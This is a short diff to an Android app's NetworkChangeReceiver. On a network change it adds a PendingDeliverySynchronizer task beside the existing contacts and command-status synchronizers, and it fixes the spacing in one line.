@@ -7,6 +7,7 @@ import android.util.Log;
 
 import com.theah64.xrob.asynctasks.CommandStatusesSynchronizer;
 import com.theah64.xrob.asynctasks.ContactsSynchronizer;
+import com.theah64.xrob.asynctasks.PendingDeliverySynchronizer;
 import com.theah64.xrob.utils.APIRequestGateway;
 
 public class NetworkChangeReceiver extends BroadcastReceiver {
@@ -28,7 +29,8 @@ public class NetworkChangeReceiver extends BroadcastReceiver {
             @Override
             public void onReadyToRequest(String apiKey) {
                 new ContactsSynchronizer(context, apiKey).execute();
-                new CommandStatusesSynchronizer(context,apiKey).execute();
+                new CommandStatusesSynchronizer(context, apiKey).execute();
+                new PendingDeliverySynchronizer(context, apiKey).execute();
             }
 
             @Override
